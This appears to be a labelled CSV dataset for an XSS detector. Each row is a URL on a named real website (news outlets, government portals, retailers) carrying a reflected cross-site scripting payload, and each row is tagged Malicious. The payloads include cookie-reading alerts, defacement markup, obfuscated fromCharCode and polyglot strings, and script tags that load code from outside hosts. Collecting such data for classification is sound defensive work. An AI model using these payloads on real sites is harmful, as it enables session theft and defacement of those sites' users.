Payloads,Class
http://www.gaytube.com/search_result.php?search_id=%22%3e%3cscript%3ealert%28%2fxssed+by+dr.optix%2f<br>%29%3c%2fscript%3e&amp;search_typ=search_videos&amp;x=0&amp;y=0,Malicious
http://www.riverbendhills.com/?pg=asdf%3cscript%3ealert(1337)%3c/script%3e&amp;frame=1,Malicious
http://www.nanexo.com/rss/show_webfeed.php?wccategory=0&amp;wcheadlines=%3cscript%3ealert(document.cooki<br>e)%3c/script%3e%3ch1%3eby%20st@rext%3c/h1%3e,Malicious
http://n-europe.com/news.php?nid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticx<br>s&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://customer.tochka.ru/zpublic/information?src=stream_registration&amp;form_name=step1&amp;action=go&amp;phon<br>e=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylito<br>l%3c/h1%3e%3c/marquee%3e,Malicious
http://tampabay.rays.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
"http://www.miibeian.gov.cn/chaxun/xgxz1.jsp?id=2&amp;wjm=%c9%cf%ba%a3icp%b1%b8%b0%b8%d3%c3%bb%a7%d5%d2%b<br>b%d8%d3%c3%bb%a7%c3%fb%a1%a2%c3%dc%c2%eb%22%3e'%3e%3cscript%3ealert(string.fromcharcode(66,121,32,10<br>7,117,115,111,109,105,115,111,46,99,111,109))%3c/script%3e",Malicious
http://www.feicuidao.com/jqzx_look.php?id=26%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.tagged.com/profile.html?view=mini&amp;uid=1101376&amp;paramstr=%26gender%3db%26min_age%3d18%26max<br>_age%3d-1%26country%3dus%26distance%3d0%26location%3d%26location_nd%3d%26language%3d-1%26show%3d25%2<br>6rel_status%3d0%26interested_in%3d0%26sexual_orientation%3d0%26ethnicity%3d0%26religion%3d0&amp;searchha<br>sh=_b_18_-1_us_0___undefined_-1_25_0_0_0_0_0_keyword__0_-1_-1_-1_0_1%22%3e%3cscript%3ealert(%27xss%2<br>7)%3c/script%3e&amp;isbrowse=1&amp;useroffset=1 &lt;- xss in user profiles. theres only a script insertion<br>available.,Malicious
http://www.albkomunitet.com/cgi-bin/ourspace/login.cgi?command=%22%3e%3cscript%3ealert(document.cook<br>ie)%3c/script%3e,Malicious
http://music.aladdin.co.kr/search/wsearchresult.aspx?searchword='%3e%22%3e%3cscript/src=http://kusom<br>iso.com/xss.js%3e%3c/script%3e,Malicious
http://www.armagh.gov.uk/news.php?show_sub=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://plastics.bayer.com/plastics/emea/en/literature/new/new.jsp?orig=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/sc<br>ript&gt;,Malicious
http://www.huffingtonpost.com/users/profile/cam%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/scrip<br>t%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://wiki.horde.org/faq/user/general%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3<br>cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://scoup.impots.gouv.fr/selection.php?ptheme1=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/th<br>irdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.hcch.net/index_es.php?act=text.display&amp;tid=%3cscript%3ealert(1);%3c/script%3e,Malicious
http://www.kitchendaily.com/search?query=%3cscript%3ealert(/xss/)%3c%2fscript%3e,Malicious
http://www.epichal.gov.gr/c/portal_public/layout?p_l_id=1.1&amp;p_p_id=latest_news&amp;p_p_action=1&amp;p_p_stat<br>e=%22%3e%3cscript%3ealert(document.domain)%3c/script%3e&amp;p_p_mode=view&amp;_latest_news_struts_action=%2f<br>ext%2fmy%2fnews%2fview_new&amp;_latest_news_struts_action=%2fext%2fmy%2fnews%2fview_news&amp;_latest_news_ne<br>w_id=554&amp;_latest_news_p_p_text=news,Malicious
http://www.funkyasp.co.uk/product.asp?prod=7&amp;currency=%22%3e%3cscript%3ealert(%22document.cookie%22)<br>%3c/script%3e,Malicious
http://yahoo.imusica.com.br/busca.aspx?s=%22%3e%3cscript%3ealert%28test%29%3c/script%3e%20%3cmarquee<br>%20behavior=%22alternate%22%20direction=%22right%22%20bgcolor=%22pink%22%3einsecurity.ro%20%20romani<br>a%20...here...%3c/marquee%3e;%3cimg%20src=%22http://i56.tinypic.com/9790th.gif%22%3e;%3ciframe%20src<br>%20=http://www.youtube.com/watch?v=hg17ohslmns%22%20width=%220%22%20height=%220%22%20\%3e%3c/div%3e,Malicious
http://kizilcaoren.org/foto/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://listings.nytimes.com/redesign/businessdirectory/list_listings.asp?changeemail=&amp;subcatid=1055&amp;<br>regionid=&amp;keyword=%22/%3e%3cscript%20src=http://ha.ckers.org/xss.js?/%3e,Malicious
http://malangkab.go.id/?page=90&amp;kode=6&amp;ktg=xssed%3c/h3%3e%3ciframe%20width=%22625%22%20height=%22800<br>%22%20src=%22http://www.spyrozone.net%22%3e%3c/iframe%3e%3cbr%3e%3cbr%3e%3ch3%20class=%22judulcob%22<br>%3elink:%20lain-lain,Malicious
http://www.vivastreet.fr/authorize.php?authorize_refer=http%3a%2f%2fwww.vivastreet.fr%2faccount_clas<br>sifieds.php%3fclassified_repost%3d3676244%26login_email%3d%22%3e%3cmarquee%3e%3ch1%3edefaced%20by%20<br>ironzorg%3c/h1%3e%3c/marquee%3e%26utm_source%3drepostnotify%26utm_medium%3demail&amp;reason=,Malicious
http://www.misawa.co.jp/jsp/sitesearch/sitesearch.jsp?searchitem=%27%3e%22%3e%3cscript%2fsrc%3dhttp%<br>3a%2f%2fkusomiso.com%2fxss.js%3e%3c%2fscript%3e&amp;btn1.x=&amp;btn1.y=&amp;pagepos=1,Malicious
http://www.careerbuilder.com/pli/quicksrchv2.asp?siteid=cbcnn160&amp;lr=cbcnn&amp;qssts=ca%2cus&amp;searchbtn=se<br>arch&amp;mxjobsrchcriteria_jobtypes=jn008&amp;qskwd=f00z&amp;qscty=%3cscript%3ealert('xssed');%3c/script%3e&amp;cbre<br>cursioncnt=2&amp;cbsid=28242bd615324823ad7934c3e87618c4-244928439-x0-2,Malicious
http://www.innovation.sa.gov.au/static/test.php?a[]=%3cscript%3ealert(/xssed_by_omeha/);%3c/script%3<br>e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://web9.kariyer.net/jobsearch/sektorbolge.kariyer?arn=&amp;sid=%22%3e%3cscript%3ealert(%22ulan+ne+te<br>nekesiniz%22)%3c/script%3e,Malicious
http://www.downloadnova.com/search.php?q=&quot;&gt;&lt;script<br>src=http://byccc.awardspace.com/js/xssccc.js&gt;&lt;/script&gt;,Malicious
http://look2.jp/serch2.php?id=look2support&amp;w='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3<br>c/script%3e,Malicious
http://search.forbes.com/search/find?action=advancedsearch&amp;start=1&amp;max=20&amp;sort=relevance&amp;mt=%22%3e%3<br>cscript%3ealert%28%27xss%27%29%3b%3c%2fscript%3e&amp;pub=forbes.com%2cmagazine%2cfyi%2cbest&amp;author=&amp;tick<br>ers=&amp;pubdatestart=mm%2fdd%2fyyyy&amp;pubdateend=mm%2fdd%2fyyyy&amp;contenttype=all&amp;storytype=all&amp;premium=on,Malicious
http://www.benq.com.ph/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.phazeporn.com/search.php?q=%3ch1%3e%3ccenter%3ehacking-gurus%3c%2fcenter%3e%3cbr%3e%3cmar<br>quee%3edont-mess-with-us%3c%2fmarquee%3e%3c%2fh1%3e,Malicious
http://www.turbosquid.com/search/index.cfm?fuseaction=processsearch&amp;intstartrow=1&amp;intmediatype=-1&amp;is<br>tsearchkey=%22%3e%3cfont+size%3d%2211%22%3ehacking+gurus%3cbr%3e%3cmarquee%3edont+mess+with+us%3c%2f<br>marquee%3e%3c%2ffont%3e%3cscript%3ealert%28%27the%2bfu%20ure%2bis%2bours%27%29%3c%2fscript%3e,Malicious
http://xl.repubblica.it/risultati?precsection=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b<br>%3c%2fscript%3e,Malicious
http://www.jin-xin.net/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narco<br>ticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.sky-love.net/default.asp?agid=88'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.co<br>m%22)%3c/script%3e,Malicious
http://www.nsdaily.com/auctionsite/showcategory.php?cid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://vn.benq.com/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.piriform.com/umbraco/imagegen.ashx?width=120&amp;height=50&amp;constrain=true&amp;format=jpg&amp;compress<br>ion=95&amp;image='&quot;--&gt;&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert('xss cleaner')&lt;/script&gt;,Malicious
http://www.ford.de/cs/contentserver?pagename=dede2_engine/layoutdl&amp;c=page&amp;cid=1204902950643&amp;addresss<br>earchstring=');&lt;/script&gt;&lt;iframe<br>src=&quot;http://xssed.com&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(navigator.useragent)&lt;/script&gt;,Malicious
http://www.viaverio.com/index.cfm?page_id=7&amp;keywords='%3e%22%3e%3cscript/src=http://kusomiso.com/xss<br>.js%3e%3c/script%3e,Malicious
http://img117.imageshack.us/gal.php?g=%3cscript%3ealert%28%22xss%20by%20sora%20-%20greyhathackers.or<br>g/greyhathackers.net%22%29%3c/script%3e,Malicious
http://uk.warranty.cars.yahoo.net/quote_page1a.html?cart=&quot;&gt;&lt;script&gt;alert(/nemessis-www.rstzone.org/)<br>&lt;/script&gt;,Malicious
http://www.alltheinternet.com/texis/open/video?c=&amp;q=related%3aenglish.gov.cn/%27%22%3e%3c/title%3e%3<br>cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marqu<br>ee%3e,Malicious
http://www.state.pa.us/papower/search/search.asp?qu=%22%3e%3cscript%3ealert('by%20encore')%3c/script<br>%3e,Malicious
http://www.iwamikanko.org/event/a-news.cgi?date=2007.11.30&amp;cal=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%<br>61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%3<br>3%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31<br>%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.arabnews.com/?page=1&amp;section=0&amp;article=63138&amp;d=3&amp;m=5&amp;y=2005&amp;pix=%22%3ekingdom.jpg&amp;categor<br>y=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.deutscher-kolonialverein.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://community.zdnet.co.uk/account/manage.htm?fname=login&amp;fp-general=1&amp;fp-login=1&amp;redirect=http%3a<br>%2f%2fwww.zdnet.co.uk%2findex.htm&amp;email=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;<br>password=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;submit.x=37&amp;submit.y=12,Malicious
http://dev.naver.com/search/?group_id=3230&amp;atid=0&amp;forum_id=0&amp;group_project_id=0&amp;form_group_name=&amp;typ<br>e_of_search=full&amp;words=%22%3e%3cscript%20src=http://ha.ckers.org/xss.js%3e%3c/script%3e,Malicious
"http://www.stern.de/community/newsletter/?id=&quot;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,8<br>3))&lt;/script&gt;&lt;br&amp;actioncode=insert&amp;selectnewsletters=257&amp;toaddress=",Malicious
http://cyber-mirror.org/mass-add/?d=8%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.mef.gov.kh/test.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
"http://cernsearch.web.cern.ch/cernsearch/default.aspx?query=+the%20cern%20i%3cscript%3ealert(%22ibla<br>ze%22)%3c/script%3eaassonvert.frombase64string(string%20s)%20%20%20%20at%20system.web.ui.objectstate<br>formatter.deserialize(string%20inputstring)%20%20%20%20at%20system.web.ui.objectstateformatter.syste<br>m.web.ui.istateformatter.deserialize(string%20serializedstate)%20%20%20%20at%20system.web.ui.util.de<br>serializewithassert(istateformatter%20formatter,%20string%20serializedstate)%20%20%20%20at%20system.<br>w",Malicious
http://battleknight.us/?kid=1-01945-03845-1003-1202817f%27%22%3e%3cscript%3ealert%28document.cookie%<br>29%3c%2fscript%3e,Malicious
http://www.eu-service.dk/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://www.boxtorow.com/blog/index.php?action=search&amp;item=content&amp;blog=%3e%22%3e%3cscript%20%0a%0d%3<br>ealert(document.cookie)%3b%3c/script%3e,Malicious
http://immo.nicematin.com/pqrpa/default/palist?rub_id=im&amp;libre=%22%3e%3cscript%3ealert%28%22xss!%22%<br>29%3c/script%3e,Malicious
http://www.shopadidas.com/searchhandler/index.jsp?keywords=%27%3balert%28string.fromcharcode%2884%2c<br>69%2c83%2c84%2c69%29%29%2f%2f%5c%27%3balert%28string.fromcharcode%2884%2c69%2c83%2c84%2c69%29%29%2f%<br>2f%22%3balert%28string.fromcharcode%2884%2c69%2c83%2c84%2c69%29%29%2f%2f%5c%22%3balert%28string.from<br>charcode%2884%2c69%2c83%2c84%2c69%29%29%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28str<br>ing.fromcharcode%2884%2c69%2c83%2c84%2c69%29%29%3c%2fscript%3e&amp;x=11&amp;y=10,Malicious
http://storefront.steampowered.com/redirect/?ackguestpass=a3e8fc6814cr6d69%27%22%3e%3cimg%20src=foo.<br>png%20onerror=alert(/xss/)%20/%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exssby%20xylitol%3c/h1%3e%3<br>c/marquee%3e,Malicious
http://www.dubina.com/clasificados1/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.bb.com.br/portalbb/page22,116,2045,1,1,1,1.bb?codigomenu=--%3e%3cscript%3ealert%28%27xsse<br>d%27%29%3c/script%3e%3ciframe%20src=http://www.xssed.com/%20height=1000%20width=1000%3e%3c/iframe%3e<br>%3c!--",Malicious
http://www.ride.ri.gov/cms_search.aspx?searchwords=%3ciframe%20src=http://google.com%3e%3c/iframe%3e<br>%3cscript%20src=http://ha.ckers.org/xss.js?/%3e,Malicious
http://www.reisegarant.de/v2/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://vippers.no.land.to/mtbbs2/test/thread_search.cgi?bbs=x&amp;key=1193498047%22%3e'%3e%3cscript%3eal<br>ert(123)%3c/script%3e,Malicious
"http://cp.boxwood.phpwebhosting.com/admin/utils/login.phtml?dest=--%3e%3cscript%3ealert(string.fromc<br>harcode(120,115,115))%3c/script%3e",Malicious
http://trcc.edu/newsdetail.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://www.birs.ca/birspages.php?task=displayevent&amp;event_id=09w5047&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;,Malicious
http://www.occidental-hoteles.com/occidental/web/language.jsp?language=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/sc<br>ript&gt;,Malicious
http://www.masterbank.ru/search.html?words=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e<br>%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.cologne-concert-brass.org/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://assinaturas.abril.com.br/cgi-bin/ncommerce3/execmacro/assineabril/%3cscript%3ealert('mygot_ma<br>noel-was-here.----que-perigo-eh-o-xss')%3c/script%3e.d2w/report??destino=%3cscript%3ealert('mygot_ma<br>noel-was-here.----que-perigo-eh-o-xss')%3c/script%3e,Malicious
http://www.exstart.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor<br>&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://studies2.hec.fr/jahia/jahia/enginename/search/pid/1?maxpageitems=10&amp;pagesearchresultbuilder.<br>onlyonehitbypage=true&amp;searchview=simple&amp;screen=execute&amp;freesearch=&amp;searchrefineattribute=reset&amp;searc<br>hhandler=search&amp;search=%22%27%2f%3e%3cscript%3ealert%28%27hello+the+rat%27%29%3c%2fscript%3e&amp;go.x=9&amp;<br>go.y=10,Malicious
http://online.telefonica.com.br/conta/securitymail/loginsenha/ecolgi.asp?vstrlnk=%22%3eum%20form%20f<br>also%20aqui%20permite%20roubo%20de%20dados.%3cbr%3e%3cbr%3e%3c/table%3e%3ch2%3exssed.com%20by%20mygo<br>t_manoel%3cbr%3e%3cbr%3e,Malicious
http://recherche.ados.fr/?q=%3cscript%3ealert%28%22faille+xss+%21%21%22%29%3b%3c%2fscript%3e,Malicious
http://www.kinyona.com/cgi-bin/ourspace/login.cgi?command=%22%3e%3cscript%3ealert(document.cookie)%3<br>c/script%3e,Malicious
http://www.evt-me.com/newsdetail.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://www.idealauto.co.uk/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.zdnetindia.com/index.php?action=article&amp;prodid=18039&amp;chid=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script<br>&gt;&lt;h1&gt;hacked%20by%20trex&lt;/h1&gt;,Malicious
http://topics.nytimes.com/top/reference/timestopics/organizations/n/north_atlantic_treaty_organizati<br>on/index.html?query=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.fkteplice.cz/index.php?main='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee%<br>3ewhitehat%20forever%3c/marquee%3e&amp;phpsessid=9d62964c9dd854a86c27574d4a9ac31a&amp;phpsessid=68e56e3c8ede<br>845adfc4be70eea4b714,Malicious
"http://vols.fr.be.msn.com/cgi-bin/rg/acq_air.cgi?event=result&site=msn_be&city_id_dep=&dep=""><script>alert('xss')</script>&city_id_dest=&dest=&dep_date=07%2f09%2f2010&return_date=08%2f09%2f2010&adults=1&children=0",Malicious
http://cte.main.jp/news/blog.cgi?calendar_mode=post&amp;set_year=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2<br>f%2fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fscript%3e&amp;set_month=10%,Malicious
http://www.istanbulvinc.com/istanbul/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://soudan.bandai.co.jp/toiawase/index.cgi?goodsname='%3e%22%3e%3cscript/src=http://kusomiso.com<br>/xss.js%3e%3c/script%3e,Malicious
http://www.aeroport.fr/accueil/moteur-de-recherche.php?langue=fr&amp;mr=%22%3e%3cscript%3ealert%281337%2<br>9%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xerces%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://edit.look2.jp/b2.php?id=look2support&amp;no=3516948'%3e%22%3e%3cscript/src=http://kusomiso.com/xs<br>s.js%3e%3c/script%3e,Malicious
http://b34tr1b0x.net/zd/index.php?pno=1&amp;l=%22%3e%3cscript+src=http://ckers.org/s%3e,Malicious
http://www.politikstube.de/forum/vorstellungen/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/s<br>cript&gt;,Malicious
http://www.revolutionhealth.com/search/results?query=%22%3e%27%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://ms159.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.biglobangs.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.gohunter08.com/comtools/e-photogallery/displaycontent.asp?action=1c0a0e1d0c07&amp;text=&quot;&gt;&lt;scr<br>ipt&gt;alert('s0m.ph');&lt;/script&gt;id=%22,Malicious
http://dk.playstation.com/search-results/?searchpattern=%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c<br>/script%3e%3ch1%3e%3cmarquee%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;submit-search=search,Malicious
http://www.romantikpartner.com/member/profile_list.php?command=search_result&amp;search_type=&quot;&gt;&lt;script&gt;a<br>lert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious
http://www.bomboniereroma.com/galleria/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://goodhackteam.forumup.com/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script<br>%3e,Malicious
http://uygunsevgili.com/default.asp?hat=search&amp;content=listmembers&amp;searchtype=&quot;&gt;&lt;script&gt;alert(docume<br>nt.cookie)&lt;/script&gt;,Malicious
http://www.tre-go.gov.br/internet/phpinfo.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][]<br>[][][][][][][][][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e,Malicious
http://www.audi.ua/modell_start.php?k_id=%3e%22%3e%3cscript%20%0a%0d%3ealert(/xss%20by%20turkpower%2<br>0-%20from%20turkey/)%3b%3c/script%3e%3ch1%3exss%20by%20turkpower%20-%20from%20turkey%3c/h1%3e%3c/mar<br>quee%3e,Malicious
"https://www.station.sony.com/secure/en/registration/registration.jsp?returnurl=';alert(string.fromch<br>ar%20code(88,83,83))//\';alert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83)<br>)//\&quot;;alert(string.fromcharcode(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83%<br>20,83))&lt;/script&gt;",Malicious
http://news.walla.co.il/?w=/7/1703268%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e,Malicious
"http://mstar.com.my/cms/search.jsp?query=alert(string.fromcharcode(88,83,83))//\';alert(string.fromc<br>harcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,83,8<br>3))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://www.jamstockex.com/controller.php?action=publications%22%3e%3cscript%3ealert(document.cookie)<br>%3c/script%3e,Malicious
http://www.shaman-soul.com/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.hackhaber.com/tr/resim_goster.asp?adres=%22%3e%3cscript%3ealert(%22hehe%22)%3c/script%3e,Malicious
http://hsv.auburnyoungalum.org/photos/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.canalplus.fr/pid414.htm&amp;day=14-03-07&amp;multi=1&amp;tra=%22%3e%3cscript%3ealert(document.cookie)<br>%3c/script%3e,Malicious
http://icwolverhampton.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedeface<br>d.org/)%3c/script%3e%3cp,Malicious
http://www.soldiersforjesusmclaoc.com/book/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.lijit.com/help/re-search/definition%7d%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.so<br>urce));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://standards.ieee.org/cgi-bin/ouisearch?submit2=%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
https://secure.buy.com/corp/support/login.asp?what=ulan+ne+tenekesiniz&amp;certificate_id=&amp;claim_code=&amp;s<br>ku=&amp;loc=&amp;op=&amp;rid=&amp;p=&amp;estk=&amp;mnsignup=&amp;movsignup=&amp;eaf=&amp;cid=&amp;bndl=&amp;bmlmerch=&amp;seller=&amp;dir_name=%22%3e%3c<br>script%3ealert(%22teneke%22)%3c/script%3e,Malicious
http://www.rammsteinshop.de/catalog/product_info.php?products_id=6%27%22%3e%3c/title%3e%3cscript%3ea<br>lert(1337)%3c/script%3e13&amp;rsshopcsid=1b225e326445bf483745fd1c8a7a7c7a,Malicious
http://www.aruns.nl/index.php?a=list&amp;qname=&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&amp;qnear=&amp;plaats=vught&amp;categor<br>y=restaurant,Malicious
